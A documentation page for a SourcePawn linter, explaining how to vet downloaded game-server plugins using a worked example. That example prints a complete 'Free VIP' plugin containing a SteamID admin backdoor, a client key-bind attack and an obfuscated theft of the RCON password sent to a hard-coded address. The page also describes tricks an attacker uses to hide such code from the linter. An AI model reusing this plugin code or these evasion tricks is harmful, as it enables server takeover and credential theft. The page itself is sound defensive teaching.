# Vetting a third-party plugin

A plugin runs with every right of the game server. A plugin from a forum or a download site can
grant its author admin rights, steal the RCON password, send player data away, or change the
players' own games. Before you install one, read its source, and let pawncritic point you to the
places that need a close look.

This page shows how, on a realistic example. The policies it uses are described in
[Malicious](policies.md#malicious) and [Security](policies.md#security).

- [The command](#the-command)
- [An example](#an-example)
- [Why `--no-config`, `--force` and `--no-ignore`](#why---no-config---force-and---no-ignore)
- [Security risks that may be honest](#security-risks-that-may-be-honest)
- [What pawncritic cannot see](#what-pawncritic-cannot-see)
- [A checklist](#a-checklist)

## The command

```sh
pawncritic --no-config --force --no-ignore --theme malicious downloads/freevip/
```

- `--theme malicious` runs the six `Malicious::` policies. They report code that has no legitimate
  use in a plugin, so every violation deserves an answer.
- `--no-config`, `--force` and `--no-ignore` make sure the plugin's author cannot hide anything from
  the run; see [below](#why---no-config---force-and---no-ignore).

Then look at the security risks, which can be honest or not:

```sh
pawncritic --no-config --force --no-ignore --theme 'security && !malicious' downloads/freevip/
```

## An example

`downloads/freevip/scripting/freevip.sp` promises free VIP for active players:

```sourcepawn
#pragma semicolon 1
#pragma newdecls required

#include <sourcemod>
#include <SteamWorks>

public Plugin myinfo = {
	name = "Free VIP",
	author = "xX_Coder_Xx",
	description = "Gives VIP to active players",
	version = "2.4",
	url = ""
};

public void OnPluginStart() {
	RegConsoleCmd("sm_vip", Command_Vip);
	CreateTimer(600.0, Timer_Stats, _, TIMER_REPEAT);
}

public Action Command_Vip(int client, int args) {
	PrintToChat(client, "VIP is free on this server!");
	return Plugin_Handled;
}

public void OnClientPostAdminCheck(int client) {
	char auth[32];
	GetClientAuthId(client, AuthId_Steam2, auth, sizeof(auth));
	if (StrEqual(auth, "STEAM_0:1:40404040")) {
		SetUserFlagBits(client, ADMFLAG_ROOT);
	}
	ClientCommand(client, "bind F8 \"say I got free VIP\"");
}

public Action Timer_Stats(Handle timer) {
	char name[] = { 114, 99, 111, 110, 95, 112, 97, 115, 115, 119, 111, 114, 100 };
	char value[128];
	FindConVar(name).GetString(value, sizeof(value));
	char url[256];
	Format(url, sizeof(url), "http://203.0.113.7/collect.php?k=%s", value);
	Handle request = SteamWorks_CreateHTTPRequest(k_EHTTPMethodGET, url);
	SteamWorks_SendHTTPRequest(request);
	return Plugin_Continue;
}
```

At a glance it looks harmless: a command, a greeting, some "stats". pawncritic sees more:

```
$ pawncritic --no-config --force --no-ignore --theme malicious downloads/freevip/
downloads/freevip/scripting/freevip.sp:28:21: [5] a hard-coded SteamID in a function that grants admin rights  Malicious::ProhibitSteamIdBackdoors
   28 |     if (StrEqual(auth, "STEAM_0:1:40404040")) {
      |                        ^^^^^^^^^^^^^^^^^^^^
      = hint: grant admin rights in the server's admin configuration

downloads/freevip/scripting/freevip.sp:31:24: [5] ClientCommand() runs `bind` on the player's game  Malicious::ProhibitClientSlowhack
   31 |     ClientCommand(client, "bind F8 \"say I got free VIP\"");
      |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

downloads/freevip/scripting/freevip.sp:35:16: [5] the text is written as character codes  Malicious::ProhibitObfuscatedStrings
   35 |     char name[] = { 114, 99, 111, 110, 95, 112, 97, 115, 115, 119, 111, 114, 100 };
      |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
      = hint: write it as a string: "rcon_password"

3 violations in 1 of 1 file (3 of severity 5).
```

Three violations, each one a reason not to install the plugin:

- **Line 28: a backdoor.** Whoever has the SteamID `STEAM_0:1:40404040` gets root admin rights on
  your server.
- **Line 31: an attack on the players.** Every player gets a key bound in their own game, which
  stays after they leave your server.
- **Line 35: hidden text.** The numbers spell `rcon_password`, as the hint shows. Nobody hides an
  honest ConVar name. `Malicious::ProhibitPasswordConVars` would have reported the name as a string,
  which is exactly why it is hidden.

The security policies add the last piece:

```
$ pawncritic --no-config --force --no-ignore --theme 'security && !malicious' downloads/freevip/
downloads/freevip/scripting/freevip.sp:39:27: [4] SteamWorks_CreateHTTPRequest() connects to `http://203.0.113.7/collect.php?k=%s`, written into the code  Security::ProhibitHardcodedEndpoints
   39 |     Format(url, sizeof(url), "http://203.0.113.7/collect.php?k=%s", value);
      |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
      = hint: read the address from a ConVar or a config file

1 violation in 1 of 1 file (1 of severity 4).
```

Together: every ten minutes, the "stats" timer reads the RCON password and sends it to an address
written into the code. With it, the author controls the server even without the backdoor.

## Why `--no-config`, `--force` and `--no-ignore`

The author of a hostile plugin knows pawncritic too. Each of these options closes a way to hide
something from the run:

| Option | Without it, the author could |
|---|---|
| `--no-config` | Ship a `.pawncritic.toml` with the plugin that turns policies off or lowers their severity. pawncritic uses the configuration file nearest to each file, and that is the plugin's own. |
| `--force` | Put `// no critic` before the first line of code, which silences every policy for the whole file. |
| `--no-ignore` | Put code into a hidden directory, such as `scripting/.cache/`, or list it in a `.gitignore`. A directory search skips both. |

Here is the same plugin as a careful attacker ships it. `freevip.sp` starts with an annotation
(`// no critic - generated file`), the archive holds a `.pawncritic.toml` that turns off
`Malicious::ProhibitObfuscatedStrings`, and more code sits in `scripting/.cache/util.inc`. A plain
run finds nothing:

```
$ pawncritic --theme malicious downloads/sneaky/
No violations in 1 file.
```

With the three options, everything is back, including the hidden include file:

```
$ pawncritic --no-config --force --no-ignore --theme malicious --no-snippets downloads/sneaky/
downloads/sneaky/scripting/.cache/util.inc:2:16: [5] the code names the ConVar `rcon_password`  Malicious::ProhibitPasswordConVars
      = hint: a plugin never needs the RCON password; remove this

downloads/sneaky/scripting/freevip.sp:29:21: [5] a hard-coded SteamID in a function that grants admin rights  Malicious::ProhibitSteamIdBackdoors
      = hint: grant admin rights in the server's admin configuration

downloads/sneaky/scripting/freevip.sp:32:24: [5] ClientCommand() runs `bind` on the player's game  Malicious::ProhibitClientSlowhack
downloads/sneaky/scripting/freevip.sp:36:16: [5] the text is written as character codes  Malicious::ProhibitObfuscatedStrings
      = hint: write it as a string: "rcon_password"

4 violations in 2 of 2 files (4 of severity 5).
```

An annotation, a configuration file or a hidden directory in a downloaded plugin does not prove bad
intent, but it is a reason to look twice at what it covers.

## Security risks that may be honest

The `Security::` policies report code that is risky, but sometimes has a purpose:

| Policy | Honest use | Questions to ask |
|---|---|---|
| `Security::ProhibitHardcodedEndpoints` | An auto-updater, a public API such as Steam's. | Which data goes there? Can the owner change or turn off the address? |
| `Security::ProhibitServerControlCommands` | A plugin manager that loads and unloads plugins. | Is that what the plugin is for? Who can trigger it? |
| `Security::ProhibitShellExecution` | A demo uploader, a backup plugin. | Which program runs, with which arguments? |
| `Security::ProhibitCodeFileWrites` | An auto-updater. | Does it check what it downloads? |
| `Security::ProhibitSecretFileAccess` | Almost none; SourceMod's API gives plugins what they need. | Why does it read the file? |
| `Security::ProhibitCommandInjection`, `Security::ProhibitSqlInjection` | None, but usually a mistake, not an attack. | Can a player exploit it? Then it must be fixed before you install. |

## What pawncritic cannot see

The `Malicious::` and `Security::` policies are heuristics. A clean run does not prove a plugin
safe. They cannot see:

- **Text that is built at run time** in ways other than a literal, a concatenation of literals or a
  `Format()` into a buffer in the same function: text read from a file, put together in another
  function, decoded with arithmetic, or downloaded. See [What the Malicious and Security policies
  can see](policies.md#what-the-malicious-and-security-policies-can-see).
- **Character codes with a terminator.** A char array of character codes that ends in `0`, as
  correct code writes it, is not reported yet. Read every array of numbers that stands where text
  belongs.
- **Macros and files that are not part of the download.** pawncritic does not expand `#define` and
  does not read included files it is not given. Include files shipped with the plugin are checked,
  as long as you check the whole download.
- **Compiled plugins.** pawncritic reads source code only. A `.smx` file can hold anything, whatever
  source comes with it. Compile the source yourself and install your own `.smx`.
- **Extensions.** A plugin that needs a native extension (a `.so` or `.dll`) brings code that runs
  outside SourcePawn altogether.

## A checklist

1. Get the source, and compile it yourself. Do not install a `.smx` you did not build.
2. Run `pawncritic --no-config --force --no-ignore --theme malicious` on the whole download. Every
   violation needs an answer before you go on.
3. Run the same with `--theme 'security && !malicious'`, and answer the questions of [Security risks
   that may be honest](#security-risks-that-may-be-honest).
4. Look at what the plugin ships besides its `.sp` files: annotations, configuration files, hidden
   directories, extensions.
5. Read the code around every violation, and the parts pawncritic cannot see: network requests, file
   access, admin functions, and any text that is not plainly written.
